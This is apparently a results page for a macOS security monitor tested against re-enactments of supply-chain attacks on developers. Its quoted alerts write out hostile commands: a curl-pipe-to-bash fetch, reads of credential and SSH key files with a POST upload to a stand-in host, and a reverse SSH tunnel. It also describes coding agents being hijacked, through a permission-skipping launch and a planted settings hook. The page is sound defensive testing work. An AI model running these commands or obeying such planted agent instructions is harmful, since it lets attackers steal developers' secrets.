# The Mac attacks you have read about, run for real

Shai-Hulud. The axios and LiteLLM compromises. The fake recruiter's take-home
project. The poisoned editor extensions. The npm package that set the
developer's own coding agent to find their secrets. The model file that
opens a shell when it is loaded. Each one hit developers' Macs and made the
news. We ran each of them on a developer's Mac with tangent watching, and
beside each one, a developer doing the same kinds of things for honest
reasons.

<!-- headline: page.py writes this -->
**11 of 11 attacks caught, in every run. 11 of 11 look-alikes left alone, in every run.**
<!-- /headline -->

<!-- results: page.py writes this -->
| Incident | Arrives as | What it does on the Mac | Attack caught | Look-alike left alone |
|---|---|---|---|---|
| [Shai-Hulud](cases/shai-hulud) | npm package | An install script hunts the Mac for tokens and keys, and republishes the developer's own packages with itself added | 3 of 3 runs | 3 of 3 runs |
| [axios compromise](cases/axios) | npm package | An install script drops a remote-access tool made to look like an Apple daemon and leaves it running | 3 of 3 runs | 3 of 3 runs |
| [LiteLLM compromise](cases/litellm) | PyPI package | A file the package installs runs on every Python start and sweeps credentials | 3 of 3 runs | 3 of 3 runs |
| [Nx "s1ngularity"](cases/nx) | npm package | An install script takes the developer's tokens and has the coding agent on the Mac, its permission prompts off, list the files worth taking | 3 of 3 runs | 3 of 3 runs |
| [Ultralytics compromise](cases/ultralytics) | PyPI package | Making the package's model downloads a coin miner into /tmp, starts it against a mining pool and deletes the file | 3 of 3 runs | 3 of 3 runs |
| [Malicious Hugging Face models](cases/model-pickle) | a model file | Loading the model's weights, a pickle, has the developer's Python connect back to an address and start a shell | 3 of 3 runs | 3 of 3 runs |
| [Contagious Interview](cases/contagious-interview) | a repository from a fake recruiter | Running the take-home project reads wallet, browser and keychain files, uploads them, and leaves a Python backdoor running | 3 of 3 runs | 3 of 3 runs |
| [Contagious Interview, by the editor](cases/contagious-interview-task) | a repository opened in the editor | A hidden task runs when the folder opens and pipes a script into bash, which installs the same stealer and backdoor | 3 of 3 runs | 3 of 3 runs |
| [GlassWorm](cases/glassworm) | an editor extension | The extension copies the login keychain, wallets and the developer's credentials, uploads them and installs a login item | 3 of 3 runs | 3 of 3 runs |
| [Trojanised Claude Code extension](cases/cursor-extension) | an editor extension | It adds an SSH key, opens a reverse tunnel and installs a login item | 3 of 3 runs | 3 of 3 runs |
| [Hijacked coding agent](cases/hijacked-agent) | a cloned repository's agent settings | A hook in the repository's settings runs the attacker's script when the agent starts, and the agent's traffic and API key go to the attacker's endpoint | 3 of 3 runs | 3 of 3 runs |
<!-- /results -->

**Attack caught** means an alert was still standing after tangent's second
look, in that many runs. **Look-alike left alone** means no alert was. The
two checks behind an alert are models and do not answer the same way every
time, so every recording is run three times and you see the count. These
runs are of tangent 0.3.2 as released, with the pipeline
`tangent init mac --hosted` writes: Claude Haiku 5.5 reads every session and
Claude Sonnet 5.5 takes the second look.

## What you get when it catches one

Not a rule name and a severity. This is tangent's alert on the trojanised
Claude Code extension, as it came out of the run (shortened):

> VS Code's Code Helper (Plugin) process, acting on behalf of the extension
> acme-tools.acme-assist-2.1.3, ran a hidden script `~/.config/.mtr` […]
> Before launching it, the same helper contacted ifconfig.me and
> api.ipify.org to learn the host's public IP, created
> `~/.ssh/authorized_keys` and a LaunchAgent masquerading as
> `~/Library/LaunchAgents/com.apple.sysstatd.plist`, and ran
> `/usr/sbin/systemsetup -setremotelogin on` […] The `.mtr` script then
> repeatedly (every 60s […]) launched `ssh -N -R *:0:localhost:22 […]`,
> opening a persistent reverse SSH tunnel from the Mac to an external host
> using a hidden private key. This was not requested by the owner […] and
> was triggered purely by the extension loading.
>
> **What to do:** Immediately disable remote login, remove/inspect
> `~/.ssh/authorized_keys` for the injected key, remove the LaunchAgent
> […], kill any running reverse-tunnel ssh processes […], and
> delete/quarantine the acme-tools.acme-assist VS Code extension […]
> Rotate SSH keys and check for other persistence this extension may have
> installed.

And this is the same second look at the look-alike, where the developer adds
their own key, checks it against GitHub and installs a database that starts
at login:

> That key is this Mac's own public key, so it grants login only to someone
> who already holds the owner's private key. […] Homebrew installed redis
> and created its sh.brew.redis LaunchAgent, which is Homebrew's normal
> service setup. `ssh -T git@github.com` checked GitHub access.

No alert. Both sessions wrote `authorized_keys`, ran `ssh` and made a launch
item. A rule on any of those fires on both or on neither.

## When the attack comes through the coding agent

Two of the cases have a real Claude Code in the VM, with a real model
answering it. In [`nx`](cases/nx) a package's install script starts the
agent with its permission prompts off and asks it for a list of the files
worth taking. In [`hijacked-agent`](cases/hijacked-agent) a repository the
person clones carries agent settings that run a script when the agent
starts. This is tangent on the second, where the person had asked the agent
for a tour of the project (shortened):

> The owner asked Claude Code only for a quick tour of the project
> (`claude -p`, 20:23:31). The session had cloned
> git.acme-starter.example/templates/starter at 20:23:22, and that clone
> created ~/code/starter/.claude/settings.json. At 20:23:32 the agent's
> shell ran `curl -fsSL https://cdn.acme-starter.example/bootstrap.sh |
> bash`. Its children then did three things. 1. They ran `cat` on
> ~/.aws/credentials, ~/.ssh/id_ed25519, ~/.config/gh/hosts.yml, ~/.npmrc
> and ~/.claude/settings.json. 2. They ran `curl -s -X POST --data-binary
> @- https://cdn.acme-starter.example/collect` straight after the reads.
> […] 3. They ran `python3 -`, which opened ~/.claude/settings.json for
> write […] The agent's environment already carries
> ANTHROPIC_BASE_URL=https://llm.acme-starter.example, so the agent's
> endpoint points at a non-vendor host […] The owner asked for none of
> this.

The look-alikes are the person using their own agent the same way: the same
`--dangerously-skip-permissions` flag to search their own repository for
committed secrets, and a hook of their own in their own project's agent
settings. The first pass marked both in all three runs. The second cleared
both in all three.

## Why every attack has a look-alike

Catching an attack is the easy half. A tool that alerts whenever a script
reads an SSH key or an installer runs from `curl` catches everything here,
and pages you all day for doing your job. So each attack is paired
with the rightful person doing the same kinds of things on their own work:
publishing their own package, running a real project's tests, installing
real extensions, zipping their own folder. tangent has to tell them apart.

tangent looks twice. A first pass reads every session and marks what
deserves a closer look; it marked eight of these eleven look-alikes in at
least one run, 18 of the 33 runs in all. A second pass investigates each of
those with the machine's history and decides. It cleared every one. You
hear only about what is left.

## How an attack is run

Each case ([`cases/`](cases)) is our own harmless re-implementation of the
incident, written step by step from the public analyses. It does for real
everything a sensor on the Mac can see: the same programs started by the
same parents, the same files read and written, connections to the same
kinds of host. It runs in a macOS VM set up as a developer's machine, set
off by commands typed into the VM's Terminal with real keystrokes, with
tangent's sensor recording. The recording then goes through tangent as it
ships.

What a sensor cannot see is not done. Nothing the payload reads is kept or
sent, the credentials and browser files on the VM are random bytes in the
right shapes, and the attacker's servers are a stand-in on the host. It is
not the incident's own malware. Each case's page says what is real in its
recording, what is stood in, and what of the incident is left out.

## Next

Incidents on the list and not recorded yet:

<!-- next: page.py writes this -->
- **Atomic Stealer** (a command pasted into Terminal): a loader collects browser, wallet and document files, sends them off and installs a launch item
- **MacSync** (a fake "install Claude" page): a loader grants itself Full Disk Access, edits the shell's start-up file and installs a login item
- **ClawHub skills** (an agent skill): a skill's "prerequisites" have the agent run an encoded command that fetches a stealer
- **Apex Accelerator** (a trojanised agent CLI): it phishes the login password, checks it, and installs a backdoor
- **BlueNoroff fake Zoom update** (a script from a fake meeting invite): it tampers with the privacy database and plants itself in the shell's start-up
<!-- /next -->

## Run it yourself

```bash
export ANTHROPIC_API_KEY=...                        # or OPENROUTER_API_KEY
python3 -I macos/replay.py RECORDING RUNS_DIR/CASE-attack-1   # a recording through `tangent` as installed; costs money
python3 -I macos/page.py RUNS_DIR                   # the counts above, from the runs
```

Recording a case again takes a Mac with [tart](https://tart.run), the VM
`evaldev` (a `macos-tahoe-base` image after [`vm/provision.sh`](vm/provision.sh)),
a notarized build of the sensor, and a tangent checkout from before its
`macos` source was built in, for the capture scripts the recorder runs in
the VM (`TANGENT_ROOT`): `./record.sh CASE attack|twin`.

## What this does not tell you

- **How often it cries wolf on a real day.** A recording is a few minutes of
  one task on a quiet VM. False alarms over real working days are a
  separate measurement, and it is not on this page yet.
- **More than these recordings.** One recording of each attack and each
  look-alike, each run three times. The counts say tangent answers the same
  way on these recordings, not how it does on the next variant.
- **The incidents' own malware.** We wrote these from the public analyses.
- **What an agent will do next time.** Where a case runs a coding agent,
  what the agent does with its prompt is the model's choice on the day. In
  the `nx` recording the agent declined the planted prompt: what tangent
  reports is the script starting it with that prompt, and the rest of what
  the script did. `hijacked-agent` is a
  disclosed weakness, not a campaign anyone has written up.
- **Anything the sensor cannot see.** It reports programs run, files opened
  and written, launch items and privacy-permission changes, and (with the
  network capture) where connections go. It does not see what is inside a
  file or a connection, what runs inside a browser tab, or a keychain item
  read through the system's API.
- **An attacker who is trying not to be seen.** The cases are the incidents
  as they happened, not variants built to slip past.
